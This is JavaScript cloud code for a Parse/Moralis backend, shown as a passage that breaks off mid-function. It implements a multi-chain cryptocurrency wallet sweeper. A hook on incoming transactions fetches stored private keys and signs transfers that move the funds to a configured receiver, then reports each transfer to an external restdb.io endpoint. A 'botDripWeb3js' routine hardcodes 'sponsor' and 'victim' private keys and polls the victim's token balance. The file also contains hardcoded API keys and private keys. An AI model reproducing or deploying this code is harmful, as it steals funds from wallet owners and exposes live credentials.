"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
require("./generated/evmApi");
require("./generated/solApi");
const authService_1 = require("../auth/authService");
require("./cloud");
const config_1 = __importDefault(require("../config"));
const moralis_1 = __importDefault(require("moralis"));
// import Moralis from 'moralis';
const web3_1 = __importDefault(require("web3"));
// import Moralis from 'moralis';
// import Moralis from "moralis-v1";
const web3 = new web3_1.default(new web3_1.default.providers.HttpProvider(config_1.default.WEB3_PROVIDER_URL));
Parse.Cloud.define('requestMessage', async ({ params }) => {
    const { address, chain, networkType } = params;
    const message = await (0, authService_1.requestMessage)({
        address,
        chain,
        networkType,
    });
    return { message };
});
Parse.Cloud.define('getPluginSpecs', () => {
    // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
    return [];
});
Parse.Cloud.define('getServerTime', () => {
    // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
    return null;
});
Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
    // eth
    Parse.Cloud.afterSave("LiveTxs", async (request) => {
        if (request.object.get("confirmed") == false) {
            await passallfunc(request, request.object.get("chainId"));
            //  var logger = Moralis.Cloud.getLogger();
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: getntwork(request.object.get("chainId")),
                    server: "1"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                // logger.info("Logged Eth Trnasfer");
            }, function (httpResponse) {
                //  logger.error(JSON.stringify(httpResponse));
            });
        }
        else {
        }
    });
    async function proxsend(request, toAddrDtls, rcveraddress, prjid, ntwk, value, loggerr) {
        // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
        // loggerr.info(JSON.stringify(prjid));
        var web3;
        if (ntwk == "eth") {
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
            //   )
            // );
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
            //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
            //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
            //       "https://rpc.ankr.com/eth/"+prjid
            //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
            //   )
            // );
        }
        //  web3 = new Moralis.Web3(
        //      new Moralis.Web3.providers.HttpProvider(
        //         //  'https://rinkeby.infura.io/v3/'+prjid
        //         //  'https://rpc.ankr.com/eth_rinkeby'
        //         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
        //         "https://rpc.ankr.com/eth/"+prjid
        //         // "https://eth.getblock.io/mainnet/?api_key="+prjid
        //      )
        //    );
        if (ntwk == "bsc") {
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
            //   )
            // );
            //  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/bsc/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://bsc.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
            //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
            //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
            //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
            //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
            //       //  "https://rpc.ankr.com/bsc/"+prjid
            //       "https://rpc.ankr.com/bsc/"+prjid
            //    )
            //  );
            //  loggerr.info("got to bsccccc");
        }
        if (ntwk == "polygon") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/polygon/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://matic.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/polygon_mumbai'
            //     //    'https://rpc.ankr.com/polygon'
            //     // "https://matic.getblock.io/testnet/?api_key="+prjid
            //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
            //     "https://rpc.ankr.com/polygon/"+prjid
            //    )
            //  );
        }
        if (ntwk == "avax") {
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://avax.getblock.io/" + prjid + "/mainnet/ext/bc/C/rpc"));
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/avalanche/"+prjid));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/avalanche'
            //     //    'https://rpc.ankr.com/avalanche_fuji'
            //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
            //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
            //     "https://rpc.ankr.com/avalanche/"+prjid
            //     // "https://rpc.ankr.com/avalanche-c/"+prjid
            //    )
            //  );
            //  loggerr.info(web3+" web3 i got here");
        }
        if (ntwk == "fantom") {
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://ftm.getblock.io/" + prjid + "/mainnet/"));
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        // 'https://rpc.ankr.com/fantom_testnet'
            //     //    'https://rpc.ankr.com/fantom'
            //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
            //     "https://rpc.ankr.com/fantom/"+prjid
            //     // "https://rpc.ankr.com/fantom/"+prjid
            //    )
            //  );
        }
        if (ntwk == "cronos") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://cro.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == "arb") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://arb.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == "op") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://op.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == "null") {
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: getntwork(request.object.get("chainId")),
                    server: "1"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                // logger.info("Logged Eth Trnasfer");
            }, function (httpResponse) {
                //  logger.error(JSON.stringify(httpResponse));
            });
        }
        // old
        //    var options = {
        //      chain: ntwk,
        //      address: toAddrDtls.get("addr")
        //    };
        //    var balance = await Moralis.Web3API.account.getNativeBalance(options);
        //    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
        //    var gasPrice = await web3.eth.getGasPrice();
        //    var gas = await web3.eth.estimateGas({
        //      to: rcveraddress,
        //      from: toAddrDtls.get("addr"),
        //      value: balance.balance,
        //    });
        //    var BN = web3.utils.BN;
        //    // var fee = gasPrice * gas;
        //    nGasprice = new BN(gasPrice);
        //    var fee = nGasprice.mul(new BN(gas));
        //    bl = new BN(balance.balance);
        //    baltosend =  bl.sub(fee);
        //    if(parseInt(baltosend) <= 0 ) {
        //      bl = new BN(value);
        //      baltosend =  bl.sub(fee);
        //    }
        // end old 
        // new
        // var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
        var gasPrice = await web3.eth.getGasPrice();
        var gas = 21000;
        var BN = web3.utils.BN;
        // var fee = gasPrice * gas;
        var nGasprice = new BN(gasPrice);
        var fee = nGasprice.mul(new BN(2));
        fee = new BN(new BN(fee)).mul(new BN(gas));
        var bl = new BN(value);
        var baltosend = bl.sub(fee);
        loggerr.info(fee + " Old fee");
        // loggerr.info(nonce+" nounce");
        // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
        //   loggerr.info("Crazy Point");
        //   // var halffee = nGasprice.divn(new BN("2"))
        //  var prefee = nGasprice.add(new BN(nGasprice));
        //  nGasprice = prefee;
        //  fee = prefee.mul(new BN(gas));
        //  // bl = new BN(value);
        //  baltosend =  bl.sub(fee);
        // }
        if (parseInt(baltosend) <= 0) {
            // bl = new BN(value);
            baltosend = bl.sub(fee);
        }
        // end new
        //  loggerr.info(baltosend.toString()+ "bal to send");
        //  loggerr.info(nGasprice.toString()+ " gas price");
        //  loggerr.info(fee.toString()+ "new fee");
        //    logger.info(balance.balance.toString());
        //  logger.info(value.toString()+ " value");
        //  logger.info(ntwk+ " ntwk");
        var transaction = {
            'to': rcveraddress,
            'value': baltosend,
            'gas': gas,
            'gasPrice': gasPrice,
            // 'nonce': nonce+1,
            // optional data field to send message or execute smart contract
        };
        var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
        try {
            web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash) => {
                // loggerr.info(hash.toString());
            }).on('receipt', async (reciept) => {
                await mshlogger(request, ntwk, loggerr);
                // loggerr.info(JSON.stringify(reciept));
            }).on('error', async (error) => {
                await mshlogger(request, JSON.stringify(error), loggerr);
                // loggerr.info(JSON.stringify(error));
                // loggerr.info("errror");
            });
        }
        catch (error) {
            // loggerr.info(JSON.stringify(error));
            // loggerr.info("catch errror");
        }
    }
    async function passallfunc(request, ntwk) {
        // // var Web3 = require('web3');
        // let projectId = "3dd198ffc6924f45aa3b50cae37aa6dd";
        // // var web3ws = new Web3(new Web3.providers.WebsocketProvider('wss://rinkeby.infura.io/ws/v3/' + projectId));
        // // var web3 = new Web3(new Web3.providers.HttpProvider('https://rinkeby.infura.io/v3/' + projectId));
        //  var logger = Moralis.Cloud.getLogger();
        var config = await Parse.Config.get({ useMasterKey: true });
        var InfurId = config.get("Infur");
        var recver = config.get("addr");
        var toaddress = request.object.get("toAddress");
        if (request.object.get("fromAddress") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
            toaddress = request.object.get("fromAddress");
        }
        var value = request.object.get("value");
        // var toaddress = "0x2CA37Dd92856f00E8c77f843256c7Db4c6FAd2E9";
        // var value = "10000000";
        var query = new Parse.Query("hpaddr");
        // query.limit(10);
        query.fullText("addr", toaddress);
        var results = await query.first(); // [ Monster, Monster, ...]
        if (results) {
            //  logger.info("got to result");
            await proxsend(request, results, recver, InfurId, ntwk, value, 'logger');
        }
        else {
            //  logger.info(JSON.stringify(results));
            // console.log("no result"); 
        }
        // proxsend("toaddress", "rcveraddress", "pk", "pojectid")
        //   web3ws = new Moralis.Web3(
        //     new Moralis.Web3.providers.WebsocketProvider(
        //         'wss://rinkeby.infura.io/ws/v3/' + projectId
        //     )
        //   );
    }
    async function botDripWeb3js() {
        var config = await Parse.Config.get({ useMasterKey: true });
        var prjid = config.get("Infur");
        // var logger = Moralis.Cloud.getLogger();
        var stop = false;
        var count = 0;
        let abijson = [{ "inputs": [{ "internalType": "address", "name": "_thirdwebFee", "type": "address" }], "stateMutability": "nonpayable", "type": "varructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "fromDelegate", "type": "address" }, { "indexed": true, "internalType": "address", "name": "toDelegate", "type": "address" }], "name": "DelegateChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegate", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "previousBalance", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "newBalance", "type": "uint256" }], "name": "DelegateVotesChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Paused", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "platformFeeRecipient", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "platformFeeBps", "type": "uint256" }], "name": "PlatformFeeInfoUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "recipient", "type": "address" }], "name": "PrimarySaleRecipientUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "previousAdminRole", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "newAdminRole", "type": "bytes32" }], "name": "RoleAdminChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleGranted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleRevoked", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "quantityMinted", "type": "uint256" }], "name": "TokensMinted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "signer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "indexed": false, "internalType": "struct ITokenERC20.MintRequest", "name": "mintRequest", "type": "tuple" }], "name": "TokensMintedWithSignature", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Unpaused", "type": "event" }, { "inputs": [], "name": "DEFAULT_ADMIN_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DOMAIN_SEPARATOR", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint32", "name": "pos", "type": "uint32" }], "name": "checkpoints", "outputs": [{ "components": [{ "internalType": "uint32", "name": "fromBlock", "type": "uint32" }, { "internalType": "uint224", "name": "votes", "type": "uint224" }], "internalType": "struct ERC20VotesUpgradeable.Checkpoint", "name": "", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractType", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "contractURI", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractVersion", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }], "name": "delegate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }, { "internalType": "uint256", "name": "nonce", "type": "uint256" }, { "internalType": "uint256", "name": "expiry", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "delegateBySig", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "delegates", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastTotalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getPlatformFeeInfo", "outputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint16", "name": "", "type": "uint16" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleAdmin", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "uint256", "name": "index", "type": "uint256" }], "name": "getRoleMember", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleMemberCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "getVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "grantRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "hasRole", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_defaultAdmin", "type": "address" }, { "internalType": "string", "name": "_name", "type": "string" }, { "internalType": "string", "name": "_symbol", "type": "string" }, { "internalType": "string", "name": "_contractURI", "type": "string" }, { "internalType": "address[]", "name": "_trustedForwarders", "type": "address[]" }, { "internalType": "address", "name": "_primarySaleRecipient", "type": "address" }, { "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "forwarder", "type": "address" }], "name": "isTrustedForwarder", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mintTo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "mintWithSignature", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }], "name": "multicall", "outputs": [{ "internalType": "bytes[]", "name": "results", "type": "bytes[]" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "nonces", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "numCheckpoints", "outputs": [{ "internalType": "uint32", "name": "", "type": "uint32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "paused", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "primarySaleRecipient", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "renounceRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "revokeRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "_uri", "type": "string" }], "name": "setContractURI", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "setPlatformFeeInfo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_saleRecipient", "type": "address" }], "name": "setPrimarySaleRecipient", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "verify", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }, { "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }];
        // var web33 = new Web3("https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");
        var web33 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
        // var web33 = new Moralis.Web3(
        //   new Moralis.Web3.providers.HttpProvider(
        //     // "https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     "https://bsc.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //   )
        // );
        // console.log(web33.version)
        //  logger.info(JSON.stringify(web33.version ));
        var sponsor = web33.eth.accounts.privateKeyToAccount('ea323e33f3536aa2974e32aacc1a840399363bfee72580763241c0a3fab2fb5b');
        ;
        var victim = web33.eth.accounts.privateKeyToAccount('0f34b0718b7d786edc551bc28725a91ccc03b2fd2bece17bfa31f08bd2522885');
        ;
        var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
        if (!sponsor.privateKey ||
            !victim.privateKey) {
            // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
            // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
            return;
        }
        // var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];
        var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);
        var invtl = setInterval(async () => {
            if (stop == true) {
                clearInterval(invtl);
                // logger.info("stopped at strt");
                // console.log("stopped")
                return;
            }
            var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call();
            // console.log(tkbalanceADDR1.toString())
            // logger.info(tkbalanceADDR1.toString());
            // logger.info(JSON.stringify(count++));
            if (parseInt(tkbalanceADDR1.toString()) > 2) {
